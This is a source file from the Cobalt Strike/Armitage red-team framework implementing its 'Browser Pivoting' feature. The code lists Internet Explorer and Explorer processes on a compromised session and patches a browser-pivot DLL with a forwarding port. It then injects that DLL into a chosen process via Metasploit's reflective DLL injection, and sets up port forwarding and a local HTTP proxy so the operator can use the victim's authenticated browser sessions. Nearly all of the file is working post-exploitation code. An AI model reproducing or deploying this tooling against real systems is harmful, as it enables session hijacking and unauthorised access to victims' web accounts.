#
# Cobalt Strike's Browser Pivoting Feature
#

import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;

# openBrowserTab(session id, port)
sub openBrowserPivotTab {
	local('$console');
	$console = [new console.Console: $preferences];
	setupConsoleStyle($console);
	logCheck($console, sessionToHost($1), "browserpivot");
	[$console updatePrompt: ""];
	thread(lambda({
		local('$cc');
		$cc = [new armitage.ConsoleClient: $console, $aclient, "cloudstrike.buffer_read", $null, "cloudstrike.buffer_release", $token, $null];
		[$frame addTab: "Browser Pivot $sid", $console, lambda({
			# kill our buffer and our console client
			[$cc actionPerformed: $null];

			# let our code do whatever it needs to do
			[$callback];
		}, \$callback, \$cc)];
	}, \$console, $token => $1, $sid => $2, $port => $3, $callback => $4));
	return $console;
}

sub setupBrowserPivot {
	thread(lambda({
		local('$panel $dialog $interfaces $table $model $scroll $a $b $generate $middle $help $c');
		local('@functions %options $middle');

		%options['ProxyPort'] = randomPort();

		# setup our dialog
		$dialog = dialog("Browser Pivot", 680, 240);
		$panel = [new JPanel];
		[$panel setLayout: [new BorderLayout]];

		# setup table to define our thing
		($table, $model) = setupTable("PID", @("PID", "PPID", "Arch", "Name", "User"), @());

		# size appropriately
		setTableColumnWidths($table, %(PID => 60, PPID => 60, Arch => 60, Name => 120, User => 240));

		$scroll = [new JScrollPane: $table];
		[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];

		# grab our info..
		m_cmd_callback($sid, "ps", lambda({
			if ($0 eq "end") {
				local('@rows $row');
				[$model clear: 128];
				@rows = parseTextTable($2, @("PID", "PPID", "Name", "Arch", "Session", "User", "Path"));
				foreach $row (@rows) {
					if (lc($row["Name"]) eq "iexplore.exe" || lc($row["Name"]) eq "explorer.exe") {
						if ($row["Arch"] eq "x86" || $row["Arch"] eq "x86_64") {
							[$model addEntry: $row];
						}
					}
				}

				[$model fireListeners];
			}
		}, \$table, \$model)); 

		# setup the dialog...
		push(@functions, tableFunction($table, $model));

		#
		$a = rowLayout(ui:text("Proxy Server Port:", "ProxyPort", @functions, %options));

		$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
			[lambda({
				local('$port $fport $pid $r $token $arch');

				# ok... close our dialog.
				[$dialog setVisible: 0];

				# extract our parameters
				$port  = int(%options['ProxyPort']);				# port for local proxy
				$fport = randomPort();						# port for port fwd (local)
				$pid   = [$model getSelectedValueFromColumn: $table, "PID"];	# pid to inject into
				$arch  = [$model getSelectedValueFromColumn: $table, "Arch"];  # blah

				# setup our HTTP proxy server and inject our DLL
				call_async_callback($mclient, "browserpivot.start", $this, $sid, $pid, $port, $fport, $MY_ADDRESS, $arch);
				yield;
				$r = convertAll($1); 
				if ($r['status'] eq "failure") {
					showError($r['message']);
					thread(lambda({ [$dialog setVisible: 1]; }, \$dialog));
					return;
				}
				$token = $r['token'];

				# setup our port fwd
				m_cmd($sid, "portfwd add -l $fport -p $fport -r 127.0.0.1");

				# open browser pivot console
				openBrowserPivotTab($token, $sid, $port, lambda({
					# kill our portfwd
					m_cmd($sid, "portfwd delete -l $fport -p $fport -r 127.0.0.1");

					# kill our HTTP proxy server
					call_async($mclient, "browserpivot.stop", $port);
				}, \$sid, \$port, \$fport));
			}, \$sid, \$table, \$model, \$dialog, %options => $1)];
		}, \$sid, \$table, \$model, \$dialog));

		$help = [new JButton: "Help"];
		[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-browser-pivoting")];

		#
		# build the form
		#
		$middle = [new JPanel];
		[$middle setLayout: [new BorderLayout]];
		[$middle add: $a, [BorderLayout NORTH]];
		[$middle add: center($generate, $help), [BorderLayout SOUTH]];

		[$dialog add: $scroll, [BorderLayout CENTER]];
		[$dialog add: $middle, [BorderLayout SOUTH]];

		[$dialog setVisible: 1];		
	}, $sid => $1));
}

# stop our browser pivot
sub api_browserpivot_stop {
	local('$port $proxy');
	($port) = convertAll($2);

	if ($port in %bpivots) {
		$proxy = %bpivots[$port];
		[$proxy stop];
	}
	return %();
}

sub browserpivot_setup_finish {
	[$proxy addProxyListener: {
		if ($1 == 0) {
			[$buffer put: "[*] $2 $+ \n"];
		}
		else if ($1 == 1) {
			[$buffer put: "[-] $2 $+ \n"];
		}
		else if ($1 == 2) {
			[$buffer put: "[+] $2 $+ \n"];
		}
		else if ($1 == 3) {
			local('$s $f $r');
			($s, $f, $r) = split(" ", $2);
			[$buffer setPrompt: "\cE[ \osuccess:\c3 $[6]s \ofail:\c4 $[6]f \obytes:\cC $[6]r \cE] "];
		}
	}];
	[$proxy start];
	[$buffer put: "[+] Started HTTP proxy server for session $sid $+ , process $pid $+ : $MY_ADDRESS $+ : $+ $port $+ \n\n"];
}

# start our browser pivot
sub api_browserpivot_start {
	# pid, port, fport, myaddress
	local('$sid $pid $port $fport $MY_ADDRESS $dllf $buffer $proxy $token $h $data $index $arch');
	($sid, $pid, $port, $fport, $MY_ADDRESS, $arch) = convertAll($2);

	# try to setup our proxy server plz
	$proxy = [new proxy.HTTPProxy: $port, "127.0.0.1", $fport];
	if ([$proxy pserver] is $null) {
		return %(status => "failure", message => "$port is already in use");
	}

	# store our proxy (so we can stop it later)
	%bpivots[$port] = $proxy;

	# come up with our token
	$token = "bpivot. $+ $port $+ ." . ticks();

	# allocate our buffer
	$buffer  = [new armitage.ArmitageBuffer: 512];
	%buffers[$token] = $buffer;

	# announce proxy server is setup
	[$buffer put: "[*] Setup local proxy server\n"];

	# drop proxy pivot DLL file
	if ($arch eq "x86_64") {
		$dllf = dropFile("resources/browserpivot.x64.dll", "browserpivot", ".dll");
	}
	else {
		$dllf = dropFile("resources/browserpivot.dll", "browserpivot", ".dll");
	}

	# read the DLL in please
	$h = openf($dllf);
	$data = readb($h, -1);
	closef($h);

	# replace COBALTSTRIKE with our port.
	$index = indexOf($data, "COBALTSTRIKE");
	$data = replaceAt($data, pack("S-", $fport), $index);

	# write out our DLL
	$h = openf("> $+ $dllf");
	writeb($h, $data);
	closef($h);

	# inject our DLL
	[$buffer put: "[*] Injecting browser pivot DLL into $pid on session $sid\n"];
	
	# display the DLL injection happening please
	local('$queue');
	$queue = [new armitage.ConsoleQueue: $mclient];
	[$queue addListener: lambda({
		if ($3 ne "") {
			[$buffer put: $3];
		}

		if ("*completed*" iswm $3) {
			# setup our proxy server to write its contents to our buffer
			fork(&browserpivot_setup_finish, \$buffer, \$proxy, \$pid, \$sid, \$port, \$MY_ADDRESS);
		}
	}, \$buffer, \$proxy, \$pid, \$sid, \$port, \$MY_ADDRESS)];
	[$queue addCommand: "", "use windows/manage/reflective_dll_inject"];
	[$queue setOptions: %(PID => $pid, PATH => $dllf, SESSION => $sid)];
	[$queue addCommand: "x", "run"];
	[$queue start];
	[$queue destroy];

	return %(status => "success", token => $token);
}
